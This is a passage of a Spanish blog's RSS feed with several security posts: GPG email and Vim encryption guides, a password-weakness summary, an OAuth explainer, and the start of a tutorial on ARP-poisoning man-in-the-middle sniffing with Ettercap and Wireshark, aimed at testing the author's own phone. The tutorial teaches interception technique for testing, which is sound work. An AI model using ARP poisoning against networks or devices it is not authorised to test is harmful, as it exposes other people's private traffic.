&lt;p&gt;Como aparece en la imagen, si es la primera vez que ambos correos se ponen en contacto, hay que enviar la clave pública para que la otra persona pueda reponder con un mensaje cifrado. Luego hacemos click en el candado y seleccionamos a clave pública con la que cifrar el mensaje, en este caso con la del correo de este blog, que hemos importado más arriba. Ya solo queda hacer click en &lt;strong&gt;Transfer&lt;/strong&gt; y obtendremos esto:&lt;/p&gt;

&lt;figure&gt;
        &lt;a href=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope3.png&#34;&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope3.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 590px) 590px, 100vw&#34;
            width=&#34;590&#34;
            height=&#34;587&#34;&gt;
          &lt;/img&gt;
        &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Pulsamos enviar y listo.&lt;/p&gt;

&lt;p&gt;El proceso contrario, es decir, cuando nos envíen un email cifrado es bastante intuitivo, abrimos el correo y nos encontramos con esto:&lt;/p&gt;

&lt;figure&gt;
        &lt;a href=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope4.png&#34;&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope4.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 795px) 795px, 100vw&#34;
            width=&#34;795&#34;
            height=&#34;380&#34;&gt;
          &lt;/img&gt;
        &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;El cursor adaptará la forma de una llave, hacemos click, introducimos nuestro &lt;strong&gt;passphrase&lt;/strong&gt; y descifraremos el mensaje.&lt;/p&gt;

&lt;p&gt;Espero que haya sido de utilidad y os animéis a usar diariamente esta tecnología.&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Editar y crear archivos cifrados con GPG en Vim</title>
            <link>https://elbauldelprogramador.com/editar-y-crear-archivos-cifrados-con-gpg-en-vim/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/editar-y-crear-archivos-cifrados-con-gpg-en-vim/</guid>
            <description>&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 400px) 400px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2013/04/GnuPG-Logo.png&#34; alt=&#34;Editar y crear archivos cifrados con GPG en Vim&#34; title=&#34;Editar y crear archivos cifrados con GPG en Vim&#34; width=&#34;400px&#34; height=&#34;175px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Hoy quiero hablaros de un plugin bastante útil que encontré para el potente editor de textos Vim, que permite crear y modificar archivos de texto bajo &lt;strong&gt;&lt;a href=&#34;https://elbauldelprogramador.com/tags/gpg&#34;&gt;gpg&lt;/a&gt;&lt;/strong&gt; (&lt;em&gt;GNU Privacy Guard&lt;/em&gt;).&lt;/p&gt;

&lt;h1 id=&#34;qué-es-gpg&#34;&gt;¿Qué es &lt;strong&gt;gpg&lt;/strong&gt;?&lt;/h1&gt;

&lt;p&gt;Me permito extraer el la definición de genbeta::Dev. Para una explicación más profunda del funcionamiento de &lt;strong&gt;gpg&lt;/strong&gt;, puedes dirigirte al artículo en GenBeta::Dev que cito en las referencias.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Antes de empezar con lo interesante tenemos que saber que es &lt;strong&gt;gpg&lt;/strong&gt; (GNU Privacy Guard), que es un derivado libre de &lt;strong&gt;PGP&lt;/strong&gt; y su utilidad es la de cifrar y firmar digitalmente, siendo además multiplataforma (&lt;a href=&#34;http://www.gnupg.org/download/index.en.html&#34; target=&#34;_blank&#34;&gt;podéis descargarlo desde la página oficial&lt;/a&gt;) aunque viene incorporado en algunos sistemas Linux, en Windows se encuentra solo con gestor gráfico).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;instalar-el-plugin-para-vim&#34;&gt;Instalar el plugin para Vim&lt;/h1&gt;

&lt;p&gt;Descarga el plugin &lt;a href=&#34;http://www.vim.org/scripts/download_script.php?src_id=18070&#34; target=&#34;_blank&#34;&gt;gnupg.vim&lt;/a&gt;. Una vez descargado, pégalo en el directorio &lt;em&gt;$HOME/.vim/plugin/&lt;/em&gt;. El último paso es añadir la siguiente línea al archivo &lt;strong&gt;.bashrc&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;GPG_TTY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;tty&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Es recomendable establecer algunas variables en el fichero de configuracón de Vim (&lt;em&gt;.vimrc&lt;/em&gt;). El mio está así:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ cat ~/.vimrc
:let g:GPGDefaultRecipients&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&amp;lt;tu-correo&amp;gt;&amp;lt;id_publica&amp;gt; -u &amp;lt;id_privada&amp;gt; --output &amp;lt;nombre_archivo.signed.gpg&amp;gt; --sign &amp;lt;archivo_original&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Plugin para Vim&lt;/em&gt; »» &lt;a href=&#34;http://www.vim.org/scripts/script.php?script_id=3645&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Introducción a &lt;strong&gt;gpg&lt;/strong&gt;&lt;/em&gt; »» &lt;a href=&#34;http://www.genbetadev.com/seguridad-informatica/manual-de-gpg-cifra-y-envia-datos-de-forma-segura&#34; target=&#34;_blank&#34;&gt;genbeta::dev&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>El modelo de seguridad de iOS (Charla del NESG en la UGR)</title>
            <link>https://elbauldelprogramador.com/el-modelo-de-seguridad-de-ios-charla-del-nesg-en-la-ugr/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/el-modelo-de-seguridad-de-ios-charla-del-nesg-en-la-ugr/</guid>
            <description>

&lt;p&gt;Hace aproximadamente dos meses empecé a asistir a las charlas del grupo de investigación NESG de mi facultad (Network Engineering &amp;amp; Security Group). En una de ellas, el conferenciante era Javier Tallón. Antiguo alumno de la facultad de Informática en Granada. Habló sobre el modelo de seguridad de iOS.&lt;/p&gt;

&lt;p&gt;Recientemente me comunicó que había puesto a disposición pública las transparencias que usó. Las comparto hoy con vosotros.&lt;/p&gt;

&lt;p&gt;Personalmente me gustó mucho la charla, no conocía gran parte de los aspectos de seguridad en iOS. Espero poder seguir acudiendo a este tipo de charlas por mucho tiempo.&lt;/p&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Grupo investigación NESG&lt;/em&gt; »» &lt;a href=&#34;http://nesg.ugr.es/&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Javier Tallón&lt;/em&gt; »» &lt;a href=&#34;http://jtsec.es/&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
        <item>
            <title>El uso de contraseñas en una evolución tecnológica</title>
            <link>https://elbauldelprogramador.com/el-uso-de-contrasenas-en-una-evolucion-tecnologica/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/el-uso-de-contrasenas-en-una-evolucion-tecnologica/</guid>
            <description>&lt;p&gt;&lt;img sizes=&#34;(min-width: 350px) 350px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2013/01/The-use-of-passwords-in-a-technological-evolution.png&#34; alt=&#34;El uso de contraseñas en una evolución tecnológica&#34; width=&#34;350px&#34; height=&#34;274px&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Hoy os traigo un artículo sobre la gran problemática que hay entorno a las contraseñas, y es que, por todos es conocido que usar contraseñas débiles puede comprometer cualquier sistema informático. A continuación resumo un artículo muy interesante que leí en &lt;strong&gt;The Hacker News&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Todos los días leemos noticias sobre algún ataque exitoso a sistemas informáticos. A menudo, sistemas de control crítico estan en la red, protegidos únicamente por una contraseña débil, o incluso con la contraseña por defecto de fábrica. El comportamiento erróneo del componente humano y la ausencia de validaciones se traduce en aplicaciones vulnerables a ataques externos.&lt;/p&gt;

&lt;p&gt;La consultoría Deloitte, recientemente publicó un informe titulado ”&lt;a href=&#34;http://www.deloitte.com/assets/Dcom-Shared%20Assets/Documents/TMT%20Predictions%202013%20PDFs/dttl_TMT_Predictions2013_Final.pdf&#34; target=&#34;_blank&#34;&gt;&lt;i&gt;Technology, Media &amp;amp; Telecommunications Predictions 2013&lt;/i&gt;&lt;/a&gt;”. En dicho informe se hacen una serie de predicciones para 2013. Entre las predicciones más destacadas figura la preocupación del uso indebido de contraseñas, que seguirá siendo en 2013 una de las causas de muchos problemas.&lt;/p&gt;

&lt;p&gt;El informe se centra en la necesidad de reconsiderar la forma de gestionar contraseñas; Duncan Stewart, Director de investigación del TMT dijo:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;”Las contraseñas con al menos ocho caracteres, un número, mezcla de mayúsculas y minúsculas y símbolos no alfanuméricos parecieran ser robustas hace algún tiempo. Pero pueden ser fácilmente crackeadas con la aparición de software y hardware avanzado.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;”Lo ideal sería usar contraseñas largas y verdaderamente aleatorias, pero la gente no las usaría”, dijo Stewart.&lt;/p&gt;

&lt;p&gt;”Una contraseña de ocho caracteres elegida de entre los 94 caracteres disponibles en un teclado estándar es una de las &lt;em&gt;6,095,689,385,410,816&lt;/em&gt; combinaciones posibles. Un ordenador relatívamente rápido del 2011 tardaría aproximadamente un año en probar todas las combinaciones. Si se tratara de averiguar la contraseña de una tarjeta de crédito, no compensaría el tiempo de cómputo. Sin embargo, un número de factores relativos al comportamiento humano y cambios en la tecnología, se han combinado para hacer a las contraseñas &lt;strong&gt;fuertes&lt;/strong&gt; vulnerables.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Descifrar contrasñas de ocho caracteres mediante ataques de fuerza bruta es posible en unas 5,5 horas. Con una máquina dedicada a tal fin, y empleando unidades de procesamiento gráfico. El precio de estas máquinas ronda los $30,000. Pero como indica el informe, es posible obtener la misma capacidad computacional mediante una gran &lt;a href=&#34;https://es.wikipedia.org/wiki/Botnet&#34; target=&#34;_blank&#34;&gt;botnet.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;La longitud de la contraseña no es la única preocupación de los investigadores. El factor humano expone el proceso de gestión de contraseñas a un riesgo muy serio. No tendemos a recordar contraseñas largas y complejas, al revés, usamos contraseñas fáciles de recordar y afines a nuestra vida cotidiana. En muchos casos, las contraseñas se reutilizan en varios servicios, desde nuestra cuenta de facebook a la bancaria. La media de usuarios tiene unas 26 cuentas protegidas con contraseña, pero solamente 5 son distintas. De acuerdo con un estudio reciente basado en seis millones de contraseñas generadas por el usuario, las 10.000 contraseñas más comunes eran usadas en el 98.1% de las cuentas. Información que nos dá una idea de cómo es de vulnerable la gestión de credenciales.&lt;/p&gt;

&lt;p&gt;Deloitte precide que en 2013 más del 90% de las contraseñas, incluso aquellas consideradas como seguras por los departamentos IT, serán hackeadas con serias consecuencias. La compañia precide, de hecho, miles de millones en pérdidas y un daño significativo a la reputación de la empresa cuyos clientes han sido víctimas de los ataques.&lt;/p&gt;

&lt;p&gt;En dicho informe se explica cómo es el proceso de averiguar una contraseña:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;“El problema no es que el atacante descubre el nombre de usuario, accede a la página de login e intenta adivinar la contraseña. Eso sería inviable, ya que la mayoría de los sitios bloquean al usuario que introduce un determinado número de veces la contraseña equivocada. La mayoría de organizaciones tienen la información del usuario y su contraseña en un archivo. Ese archivo está hasheado, es decir, usando algoritmos de &lt;a href=&#34;https://elbauldelprogramador.com/lo-ultimo-en-criptografia-fully-homomorphic-encryption/&#34; title=&#34;Lo último en criptografía: Fully Homomorphic Encryption&#34;&gt;encriptación&lt;/a&gt; se cifran el nombre de usuario y contraseña. Nadie en la organización puede ver las contraseñas en su forma descifrada. Cuando el usuario intenta logearse, el servidor vuelve a cifrar los datos introducidos y los comprueba con los que hay en el fichero. Hasta ahora, parece seguro. Sin embargo, éstos ficheros a menudo son robados. Mediante varios tipos de software y hardware, el atacante puede descifrar ciertos usuarios y contraseñas. Una vez descifrados, esta información se vende, se comparte o es explotada por el atacante.“&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Además, otro problema referente a las contraseñas viene dado por la plataforma que se use. Si consideramos que la media de usuarios tarda unos 4-5 segundos en escribir una contraseña ”fuerte” de diez caracteres en un teclado convencional. Unos 7-10 segundos en un dispositivo móvil con teclado hardware y de 7 a 30 segundos en pantallas táctiles, un cuarto de la gente encuestada admitió usar contraseñas menos seguras para ahorrar tiempo.&lt;/p&gt;

&lt;p&gt;Para finalizar, muestro el top ten de peores contraseñas según SplashData. Los puestos del 1 al 3 no han cambiado con respecto al año pasado. Sin embargo este año aparecen en la lista contraseñas como &lt;strong&gt;”welcome” ”jesus”&lt;/strong&gt; o &lt;strong&gt;”ninja”&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;password (=)&lt;/li&gt;
&lt;li&gt;123456 (=)&lt;/li&gt;
&lt;li&gt;12345678 (=)&lt;/li&gt;
&lt;li&gt;abc123 (sube 1)&lt;/li&gt;
&lt;li&gt;qwerty (baja 1)&lt;/li&gt;
&lt;li&gt;monkey (=)&lt;/li&gt;
&lt;li&gt;letmein (sube 1)&lt;/li&gt;
&lt;li&gt;dragon (sube 2)&lt;/li&gt;
&lt;li&gt;111111 (sube 3)&lt;/li&gt;
&lt;li&gt;baseball (subo 1)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Si usas cualquiera de estas contraseñas, deberías cambiarla.&lt;/p&gt;

&lt;p&gt;Está claro que al final el eslabón más débil en seguridad es el ser humano, y no parece que muchos estén dispuestos a cambiar. Innumerables veces he intentado convencer a familiares mios de que cambien sus contraseñas por se muy, muy sencillas y no me han hecho caso. Siempre dicen ”&lt;strong&gt;Pero quién va a querer meterse en mi cuenta de tal servicio&lt;/strong&gt;”&lt;/p&gt;

&lt;p&gt;Si estás interesado en saber más acerca de este tema puede que te interesen los siquientes enlaces:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://elbauldelprogramador.com/basta-con-las-tablas-arcoiris-lo-que-necesitas-saber-sobre-esquemas-de-contrasenas-seguras/&#34; title=&#34;Basta con las Tablas Arcoiris: lo que necesitas saber sobre esquemas de contraseñas seguras&#34;&gt;Basta con las Tablas Arcoiris: lo que necesitas saber sobre esquemas de contraseñas seguras&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://elbauldelprogramador.com/como-se-almacenan-tus-contrasenas-en-internet-y-cuando-la-longitud-de-la-misma-no-importa/&#34; title=&#34;Cómo se almacenan tus contraseñas en internet (y cuando la longitud de la misma no importa)&#34;&gt;Cómo se almacenan tus contraseñas en internet (y cuando la longitud de la misma no importa)&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;thehackernews.com&lt;/em&gt; »» &lt;a href=&#34;http://thehackernews.com/2013/01/the-use-of-passwords-in-technological.html&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Entendiendo OAuth: Qué ocurre cuando te loggeas en un sitio con Google, Twitter o Facebook</title>
            <link>https://elbauldelprogramador.com/entendiendo-oauth-que-ocurre-cuando-te-loggeas-en-un-sitio-con-google-twitter-o-facebook/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/entendiendo-oauth-que-ocurre-cuando-te-loggeas-en-un-sitio-con-google-twitter-o-facebook/</guid>
            <description>&lt;p&gt;Loggearte en otro sitio con tu cuenta de Google, Twitter o Facebook no sólo es conveniente sino que además es más segura que crear una nueva cuenta, o ingresar tu contraseña de Google, Twitter o Facebook en un sitio de terceros. Aquí es donde OAuth entra en acción. Veamos cómo funciona y cómo mantiene nuestras contraseñas seguras en sitios de terceros.&lt;/p&gt;

&lt;p&gt;Hace poco, &lt;a href=&#34;http://lifehacker.com/5917895/twitter-service-tweetgif-hacked-time-to-prune-your-twitter-apps&#34; target=&#34;_blank&#34;&gt; una aplicación de Twitter llamada Tweetgif fue hackeada&lt;/a&gt;, liberando informacion de usuario de 10000 cuentas de Twitter al público. De todas maneras, ninguna credencial de Twitter fue comprometida, dado que Tweetgif usó algo llamado OAuth. Si alguna vez te loggeaste en un sitio web de terceros con tu cuenta de Google, Facebook, o Twitter otorgándole permisos a la aplicación sobre esa cuenta, sin importar si lo sabías o no, has usado OAuth, y es una magnífica forma de entregar permisos.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;cómo-funciona-oauth&#34;&gt;Cómo funciona OAuth&lt;/h1&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 300px) 300px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/06/medium1.jpg&#34; alt=&#34;&#34; title=&#34;medium&#34; width=&#34;300px&#34; height=&#34;166px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Digamos que quieres usar una aplicación como Tweetgif para postear divertidas imágenes GIF animadas en tu cuenta de Twitter. Para lograrlo, es necesario darle a Tweetgif acceso a tu cuenta de Twitter, para poder obtener tu info y postear tweets en tu nombre. En los viejos tiempos, tenías que darle a una aplicación como Tweetgif tu nombre de usuario y contraseña de Twitter, para que pueda loggearse y acceder a los servicios. No solo tenías que confiar que usen esas credenciales sabiamente, sino que también debías mantenerlas protegidas de los hackers - lo que era un verdadero gran salto de fe. Es como darle las llaves de tu casa a un extraño y confiar que no hará copias para todos sus amigos y luego robar todas tus cosas.&lt;/p&gt;

&lt;p&gt;OAuth evita este problema simplemente dándoles acceso a las cosas que quieras que accedan. En lugar de pedirte la contraseña, sucede lo siguiente:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Para convertirse en una aplicación de Twitter, Tweetgif adquirió dos tokens del servicio de Twitter: una &amp;ldquo;Consumer Key&amp;rdquo; (Clave de Consumidor) y una &amp;ldquo;Consumer Secret&amp;rdquo; (Secreto de Consumidor). Estos son los elementos que crean una conexión entre el consumidor (en este caso, Tweetgif) y el proovedor del servicio (en este caso, Twitter).&lt;/li&gt;
&lt;li&gt;Cuando quieres accedef a Twitter a traves de Tweetgif, éste te redirecciona a la portada de Twitter. Si no estás loggeado, te loggeas en ese momento (recuerda que le estás dando tu usuario y contraseña a Twitter, no a Tweetgif).&lt;/li&gt;
&lt;li&gt;Twitter luego te pregunta si quieres autorizar esta aplicación, y te aclara qué permisos se le dará a la misma. Quizás pueda ver tu timeline, o tal vez pueda no sólo ver el timeline sino también postear en tu nombre. En algunos casos, puedes sólamente estar dándole acceso solamente a tu nombre de usuario y avatar para usar en sitios como Lifehacker - es simplemente una forma más fácil y segura de comentar sin tener que crear una cuenta. Cuando presionas el botón &amp;ldquo;Autorizar&amp;rdquo;, se crea un &amp;ldquo;Access Token&amp;rdquo; (Vale para acceso) y un &amp;ldquo;Access Token Secret&amp;rdquo; (Vale para acceso secreto). Son como contraseñas, pero sólo permiten que Tweetgif acceda a tu cuenta y haga las cosas que le permitiste.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Por lo tanto, en lugar de darles la llave de toda tu casa, les estás dando una llave especial que sólo abre la única habitación que quieres que entren. Pero, para usar esta llave, tienen que pedírsela al guardia, y él puede negárselas cuando quiera.&lt;/p&gt;

&lt;h1 id=&#34;entonces-deberías-usar-oauth&#34;&gt;¿Entonces deberías usar OAuth?&lt;/h1&gt;

&lt;p&gt;¿Por qué es mejor que simplemente ingresar las credenciales de Twitter? Obviamente, esto evita que las aplicaciones de terceros hagan cosas poco claras que no quieres que hagan, pero lo más importante es que esto significa que incluso si ellos son hackeados - como pasó con Tweetgif ayer - tu contraseña de Twitter está todavía a salvo. Los hackers tendrán la posibilidad de postear en tu nombre, seguir personas, o hacer cualquier cosa que le hayas permitido a Tweetgif, pero todo lo que necesitas hacer es ir a tu configuración de Twitter y quitarle el acceso a dicha aplicación. De este modo, tus tokens se vuelven inútiles y tu cuenta está bajo control nuevamente, sin siquiera tener que cambiar la contraseña.&lt;/p&gt;

&lt;p&gt;La gran desventaja de esta innovación es que algunos sitios podrían dejar loggear usando Facebook o Twitter e intentarán postear en tu perfil, incluso si no es realmente &lt;em&gt;necesario&lt;/em&gt;. Algunos sitios, como el reproductor de música &lt;a href=&#34;http://turntable.fm/&#34; target=&#34;_blank&#34;&gt;Turntable.fm&lt;/a&gt;, no te permiten crear una cuenta - debes loggearte con Facebook o Twitter. Es conveniente, dado que no tienes que crear una cuenta, pero luego éste intenta postear en tu perfil sobre qué estás haciendo en su sitio. De manera similar, &lt;a href=&#34;http://waxy.org/2012/02/the_perpetual_invisible_window_into_your_gmail_inbox/&#34; target=&#34;_blank&#34;&gt;Google no te dice realmente qué permisos otorgas&lt;/a&gt; cuando usas OAuth. Para evitar problemas, asegúrate de leer la política de privacidad de cada aplicación a la que te conectas, y si puedes, presta atención a los permisos que cada aplicación obtiene. Si detectas algo que no quieres que la aplicación haga, simplemente no la uses. O, como alternativa, fíjate si hay una opción para desactivar esta &amp;ldquo;característica&amp;rdquo; en la configuración de la aplicación (Turntable, por ejemplo, te permite desactivar los posteos en el muro de Facebook en su configuración luego de loggearte). Y, como siempre, asegúrate de regularmente reducir tus aplicaciones autorizadas así no te metes en problemas - si no has usado alguna por un tiempo, probablemente es mejor quitarla por completo.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Fuente: &lt;a href=&#34;http://lifehacker.com/5918086/understanding-oauth-what-happens-when-you-log-into-a-site-with-google-twitter-or-facebook&#34; target=&#34;_blank&#34;&gt;lifehacker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Esnifando la red (Pruebas de seguridad): Ettercap y Wireshark (Man in the middle)</title>
            <link>https://elbauldelprogramador.com/esnifando-la-red-pruebas-de-seguridad/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/esnifando-la-red-pruebas-de-seguridad/</guid>
            <description>&lt;h1 id=&#34;introducción&#34;&gt;Introducción&lt;/h1&gt;

&lt;p&gt;Recientemente he leido los problemas de &lt;a href=&#34;https://elbauldelprogramador.com/categorias/#seguridad&#34; title=&#34;Artículos sobre seguridad&#34;&gt;seguridad&lt;/a&gt; que tiene &lt;a href=&#34;http://gizmovil.com/2011/05/fallo-de-seguridad-en-whatsapp-que-permite-acceder-a-los-mensajes-y-numeros-de-telefono&#34;&gt;WhatsApp&lt;/a&gt;, con lo que me entró curiosidad por hacer algunas pruebas yo mismo y esnifar el tráfico de red de mi móvil, pero en este caso para la aplicación que estoy desarrollando, &lt;a href=&#34;https://elbauldelprogramador.com/avances-en-el-proyecto-android-de-fin/&#34;&gt;WifiBar&lt;/a&gt;. Antes de nada voy a explicar las técnicas y programas que he usado.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;ettercap-y-wireshark&#34;&gt;Ettercap y Wireshark&lt;/h1&gt;

&lt;p&gt;Bien, vamos con los programas, he usado &lt;a href=&#34;http://ettercap.sourceforge.net/&#34;&gt;ettercap&lt;/a&gt; y &lt;a href=&#34;http://www.wireshark.org/&#34;&gt;wireshark&lt;/a&gt;. Estos programitas se usan para lo siguiente, Ettercap principalmente lo he usado para el envenenamiento ARP de la máquina objetivo (en este caso el móvil), para realizar la técnica de &lt;em&gt;Man on the Middle&lt;/em&gt;, que consiste en establecer la puerta de enlace predeterminada del equipo objetivo a la dirección ip del equipo atacante. De esta manera nuestro equipo atacante estará situado entre el router y el objetivo, logrando así escuchar todo el tráfico de red que genera el objetivo. (Más adelante explicaré como hacer esto).&lt;/p&gt;

&lt;p&gt;Wireshark finalmente lo uso para &lt;em&gt;“Ver”&lt;/em&gt; el tráfico que genera el objetivo.&lt;/p&gt;

&lt;p&gt;Podemos instalar estos dos programas mediante la consola:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr@hkr-pc:~$ sudo aptitude install ettercap wireshark
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Una vez instalado, abrimos ettercap:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr@hkr-pc:~$ sudo ettercap -C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Y nos abrirá una pantalla como esta:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 669px) 669px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34;  height=&#34;449&#34; width=&#34;669&#34; src=&#34;https://2.bp.blogspot.com/-6aC4HXLtK7k/TdlRoid4i2I/AAAAAAAAAgs/XHR8h0qNXss/s800/ettercap1.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Una vez abierta, le damos a &lt;code&gt;Sniff -&amp;gt; Unified sniffing&lt;/code&gt;, y tendremos que introducir la interfaz que queramos esnifar, en mi caso wlan0 (Ya que el móvil se conecta por wifi).&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 616px) 616px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34;  height=&#34;79&#34; width=&#34;616&#34; src=&#34;https://4.bp.blogspot.com/-bJscHRVIt3U/TdlSWHzopEI/AAAAAAAAAg0/9iVj3S96Jpo/s800/interface.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;El siguente paso es escanear la red en busca de host, &lt;code&gt;Hosts -&amp;gt; Scan for hosts&lt;/code&gt;. Al pulsar comenzará a escanear y en el recuadro de abajo nos aparecerá cuantos host encontró, en mi caso:&lt;/p&gt;

&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 667px) 667px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34;  height=&#34;444&#34; width=&#34;667&#34; src=&#34;https://2.bp.blogspot.com/-UHuz1c4HInM/TdlTPkAoLYI/AAAAAAAAAg8/gEU_PTHohgA/s800/host.png&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

